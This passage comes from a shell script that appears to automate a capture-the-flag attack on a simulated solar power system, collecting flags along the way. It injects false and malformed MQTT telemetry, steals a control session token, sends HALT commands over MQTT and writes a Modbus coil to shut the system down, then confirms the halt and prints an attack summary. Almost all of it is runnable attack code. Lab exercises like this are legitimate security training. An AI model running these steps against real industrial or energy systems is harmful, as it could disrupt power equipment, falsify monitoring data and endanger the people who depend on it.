  ADMIN_FLAG=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/flag/admin_access 2>/dev/null | jq -r '.flag // empty')
  if [ -n "$ADMIN_FLAG" ]; then
    echo -e "${GREEN}[✓]${NC} ${MAGENTA}FLAG #4 CAPTURED:${NC} ${WHITE}${ADMIN_FLAG}${NC}"
  fi
  
  # Access admin logs
  echo -e "${YELLOW}[*]${NC} Accessing admin logs..."
  TEMP_PHISH_LOGS_JSON=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/api/admin/logs/phishing \
    -H "Authorization: Bearer ${ADMIN_TOKEN}" 2>/dev/null || echo '{}')
  PHISH_LOGS=$(echo "$TEMP_PHISH_LOGS_JSON" | jq -r '.logs[]' 2>/dev/null | head -2)
  
  if [ -n "$PHISH_LOGS" ]; then
    echo -e "${GRAY}    Recent phishing activity:${NC}"
    echo "$PHISH_LOGS" | while read log; do
      echo -e "${GRAY}      • ${log}${NC}"
    done
  fi
else
  echo -e "${RED}[✗]${NC} Authentication failed"
fi
echo ""

# Phase 5: MQTT Telemetry Manipulation
echo -e "${BLUE}[PHASE 5]${NC} ${WHITE}MQTT Telemetry Manipulation${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

if command -v mosquitto_sub &>/dev/null && command -v mosquitto_pub &>/dev/null; then
  echo -e "${YELLOW}[*]${NC} Capturing legitimate MQTT telemetry..."
  echo -e "${CYAN}    [MQTT SUB]${NC} ${GRAY}Broker: ${MQTT_HOST}:1883${NC}"
  echo -e "${CYAN}    [MQTT SUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
  echo -e "${CYAN}    [MQTT SUB]${NC} ${GRAY}QoS: 0 (At most once)${NC}"
  
  MQTT_DATA=$(timeout 3 mosquitto_sub -h ${MQTT_HOST} -t pv/telemetry -C 1 2>/dev/null || echo '{}')
  
  if [ -n "$MQTT_DATA" ] && [ "$MQTT_DATA" != "{}" ]; then
    echo -e "${GREEN}[✓]${NC} Captured telemetry packet"
    echo -e "${CYAN}    [MQTT]${NC} ${GRAY}Topic: pv/telemetry${NC}"
    echo -e "${CYAN}    [MQTT]${NC} ${GRAY}Payload: ${MQTT_DATA}${NC}"
    
    # Extract current values
    CURRENT_POWER=$(echo "$MQTT_DATA" | jq -r '.power_kw // 0' 2>/dev/null)
    
    # Inject fuzzed data
    echo -e "${YELLOW}[*]${NC} Injecting fuzzed MQTT telemetry..."
    
    # Send extremely high power reading
    FUZZ_HIGH='{"power_kw":999.99,"voltage_v":480,"current_a":2083,"timestamp":'$(date +%s)'.5}'
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: ${FUZZ_HIGH}${NC}"
    mosquitto_pub -h ${MQTT_HOST} -t pv/telemetry -m "$FUZZ_HIGH" 2>/dev/null
    echo -e "${GREEN}[✓]${NC} Injected HIGH power reading: ${WHITE}999.99 kW${NC} (Impossible for residential PV)"
    sleep 1
    
    # Send negative power (grid export)
    FUZZ_NEG='{"power_kw":-50.0,"voltage_v":240,"current_a":-208,"timestamp":'$(date +%s)'.5}'
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: ${FUZZ_NEG}${NC}"
    mosquitto_pub -h ${MQTT_HOST} -t pv/telemetry -m "$FUZZ_NEG" 2>/dev/null
    echo -e "${GREEN}[✓]${NC} Injected NEGATIVE power: ${WHITE}-50 kW${NC} (Simulating grid attack)"
    sleep 1
    
    # Send zero values (system offline)
    FUZZ_ZERO='{"power_kw":0,"voltage_v":0,"current_a":0,"timestamp":'$(date +%s)'.5}'
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: ${FUZZ_ZERO}${NC}"
    mosquitto_pub -h ${MQTT_HOST} -t pv/telemetry -m "$FUZZ_ZERO" 2>/dev/null
    echo -e "${GREEN}[✓]${NC} Injected ZERO values: ${WHITE}0 kW${NC} (Fake system shutdown)"
    sleep 1
    
    # Send malformed JSON (DoS attempt)
    FUZZ_MALFORMED='{"power_kw":"AAAA","voltage_v":null,"current_a":[]}'
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: ${FUZZ_MALFORMED}${NC}"
    mosquitto_pub -h ${MQTT_HOST} -t pv/telemetry -m "$FUZZ_MALFORMED" 2>/dev/null
    echo -e "${GREEN}[✓]${NC} Injected MALFORMED data: ${WHITE}Type confusion attack${NC}"
    
  else
    echo -e "${GRAY}[!]${NC} No telemetry captured in timeout window"
  fi
  
  # Capture control session
  echo -e "${YELLOW}[*]${NC} Attempting to capture control session token..."
  echo -e "${CYAN}    [MQTT SUB]${NC} ${GRAY}Topic: pv/status${NC}"
  CONTROL_TOKEN=$(timeout 3 mosquitto_sub -h ${MQTT_HOST} -t pv/status -C 1 2>/dev/null | \
    jq -r '.session // empty' 2>/dev/null || echo "")
  
  if [ -n "$CONTROL_TOKEN" ]; then
    echo -e "${GREEN}[✓]${NC} ${MAGENTA}Control session token:${NC} ${WHITE}${CONTROL_TOKEN}${NC}"
    
    # Attempt to send HALT command via MQTT
    echo -e "${YELLOW}[*]${NC} Sending HALT command via MQTT..."
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/control${NC}"
    echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: {\"command\":\"HALT\",\"session\":\"${CONTROL_TOKEN}\"}${NC}"
    mosquitto_pub -h ${MQTT_HOST} -t pv/control \
      -m "{\"command\":\"HALT\",\"session\":\"${CONTROL_TOKEN}\"}" 2>/dev/null || true
    echo -e "${GREEN}[✓]${NC} HALT command sent via MQTT"
  else
    echo -e "${GRAY}[!]${NC} No control token captured"
  fi
else
  echo -e "${GRAY}[!]${NC} mosquitto clients not installed, skipping MQTT manipulation"
fi
echo ""

# Phase 6: Modbus ICS Protocol Exploitation
echo -e "${BLUE}[PHASE 6]${NC} ${WHITE}Modbus ICS Protocol Exploitation${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

if /opt/venv/bin/python3 -c "import pymodbus" &>/dev/null; then
  echo -e "${YELLOW}[*]${NC} Scanning Modbus holding registers..."
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Target: ${PV_HOST}:${PV_MODBUS_PORT}${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Protocol: Modbus/TCP${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Function Code: 0x01 (Read Coils)${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Function Code: 0x03 (Read Holding Registers)${NC}"
  
  # Read current Modbus state
  MODBUS_READ=$(/opt/venv/bin/python3 << MODBUS_READ_EOF
from pymodbus.client import ModbusTcpClient
import json, sys

try:
    client = ModbusTcpClient('${PV_HOST}', port=${PV_MODBUS_PORT}, timeout=3)
    if client.connect():
        coils = client.read_coils(0, 10)
        regs = client.read_holding_registers(0, 10)
        client.close()
        
        result = {
            'coils': coils.bits[:10] if hasattr(coils, 'bits') else [],
            'registers': regs.registers if hasattr(regs, 'registers') else []
        }
        print(json.dumps(result))
    else:
        print('{}')
except:
    print('{}')
MODBUS_READ_EOF
)
  
  if [ -n "$MODBUS_READ" ] && [ "$MODBUS_READ" != "{}" ]; then
    echo -e "${GREEN}[✓]${NC} Modbus registers enumerated"
    
    COILS=$(echo "$MODBUS_READ" | jq -r '.coils // []')
    REGS=$(echo "$MODBUS_READ" | jq -r '.registers // []')
    
    echo -e "${CYAN}    [MODBUS READ]${NC} ${GRAY}Coils (0-9): ${COILS}${NC}"
    echo -e "${CYAN}    [MODBUS READ]${NC} ${GRAY}Holding Registers (0-9): ${REGS}${NC}"
  fi
  
  echo -e "${YELLOW}[*]${NC} Executing Modbus HALT attack (Write Coil 1)..."
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Target: ${PV_HOST}:${PV_MODBUS_PORT}${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Function Code: 0x05 (Write Single Coil)${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Register Address: 0x0001 (Coil 1)${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Value: 0xFF00 (TRUE/ON)${NC}"
  echo -e "${CYAN}    [MODBUS]${NC} ${GRAY}Unit ID: 1 (default)${NC}"
  
  # Execute Modbus attack
  /opt/venv/bin/python3 /home/attacker/tools/attacker_modbus.py ${PV_HOST} ${PV_MODBUS_PORT} 2>&1 | while read line; do
    echo -e "${GRAY}    Modbus write result: ${line}${NC}"
  done
  
  sleep 2
  
  # Verify system halted
  SYS_STATUS=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/api/status 2>/dev/null | jq -r '.status // "UNKNOWN"')
  
  if [ "$SYS_STATUS" = "HALTED" ]; then
    echo -e "${GREEN}[✓]${NC} ${MAGENTA}SYSTEM HALTED SUCCESSFULLY${NC}"
    echo -e "${GRAY}    Status: ${WHITE}${SYS_STATUS}${NC}"
    
    # Retrieve Modbus attack flag from logs
    if [ -n "$ADMIN_TOKEN" ]; then
      MODBUS_LOG=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/api/admin/logs/modbus_attacks \
        -H "Authorization: Bearer ${ADMIN_TOKEN}" 2>/dev/null | jq -r '.logs[]' 2>/dev/null | tail -1)
      
      if [ -n "$MODBUS_LOG" ]; then
        MODBUS_FLAG=$(echo "$MODBUS_LOG" | grep -o 'BSY{[^}]*}')
        if [ -n "$MODBUS_FLAG" ]; then
          echo -e "${GREEN}[✓]${NC} ${MAGENTA}FLAG #5 CAPTURED:${NC} ${WHITE}${MODBUS_FLAG}${NC}"
        fi
      fi
    fi
  else
    echo -e "${YELLOW}[!]${NC} System status: ${SYS_STATUS}"
  fi
else
  echo -e "${RED}[✗]${NC} pymodbus not installed in attacker container"
fi
echo ""

# Final Summary
echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${WHITE}                    ATTACK SUMMARY                              ${CYAN}║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"

echo -e "${WHITE}Completed Attack Phases:${NC}"
echo -e "  ${GREEN}✓${NC} Phase 1: Reconnaissance & Network Scanning"
echo -e "  ${GREEN}✓${NC} Phase 2: Man-in-the-Middle (ARP Spoofing)"
echo -e "  ${GREEN}✓${NC} Phase 3: Social Engineering (Phishing)"
echo -e "  ${GREEN}✓${NC} Phase 4: Admin Panel Authentication"
echo -e "  ${GREEN}✓${NC} Phase 5: MQTT Telemetry Manipulation"
echo -e "  ${GREEN}✓${NC} Phase 6: Modbus ICS Protocol Exploitation"

echo ""
echo -e "${WHITE}Final System Status:${NC}"
FINAL_STATUS=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/api/status 2>/dev/null || echo '{}')
echo "$FINAL_STATUS" | jq -r 'to_entries | .[] | "  \(.key): \(.value)"' 2>/dev/null | while read line; do
  echo -e "${GRAY}${line}${NC}"
done

echo ""
echo -e "${CYAN}[*]${NC} ${WHITE}All attack phases completed${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"
